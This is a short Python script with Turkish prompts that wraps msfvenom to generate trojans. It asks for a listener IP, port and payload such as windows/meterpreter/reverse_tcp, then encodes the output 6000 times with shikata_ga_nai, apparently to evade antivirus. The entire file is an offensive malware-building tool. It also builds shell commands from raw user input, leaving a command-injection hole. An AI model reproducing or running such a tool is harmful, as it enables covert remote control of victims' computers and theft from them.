#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os

os.system("clear")
os.system("apt install -y msfvenom")
os.system("apt full-upgrade msfvenom")
os.system("clear")
os.system("figlet Trojan Olusturma")


print("""

Trojan oluşturma programına hoş geldiniz

""")

ip = input("Hedef ip adresi: ")

port = input("Port numarası: ")

payload = input("Trojan adı(Örneğin windows/meterpreter/reverse_tcp): ")

dosya = input("İşletim sistemine göre dosya türü: ")

kayit = input("Trojanın kayıt edileceği konum: ")

platform = input("İşletim sistemi: ")

os.system("msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + port + " -f " + dosya + " --platform " + platform + " -e x86/shikata_ga_nai -i 6000" + " -o " + kayit)

restart = input("Yeni trojan oluşturmak istermisiniz? (E/h): ")

e = str("E")

if e == restart.upper():

    os.system("python3 'Trojan Oluştur.py'")

elif restart == "":

    os.system("python3 'Trojan Oluştur.py'")


else:

    exit()
